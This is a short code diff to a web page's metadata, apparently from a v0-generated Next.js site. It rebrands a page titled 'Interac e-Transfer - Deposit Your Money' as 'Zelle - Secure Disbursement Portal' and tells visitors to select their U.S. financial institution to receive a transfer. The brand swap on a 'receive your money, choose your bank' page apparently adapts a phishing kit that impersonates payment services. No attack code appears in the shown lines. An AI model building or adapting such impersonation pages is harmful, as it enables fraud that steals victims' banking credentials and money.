@@ -14,14 +14,14 @@ export const viewport: Viewport = {
   initialScale: 1,
   maximumScale: 1,
   userScalable: false,
-  themeColor: "#080808",
+  themeColor: "#6D1ED4",
   viewportFit: "cover",
 }
 
 export const metadata: Metadata = {
-  title: "Interac e-Transfer - Deposit Your Money",
+  title: "Zelle - Secure Disbursement Portal",
   description:
-    "Secure money transfer deposit interface for Interac e-Transfer. Select your financial institution to complete your transaction.",
+    "Secure Zelle payment disbursement portal. Select your U.S. financial institution to receive your Zelle transfer.",
   generator: "v0.app",
   icons: {
     icon: "/favicon.ico",
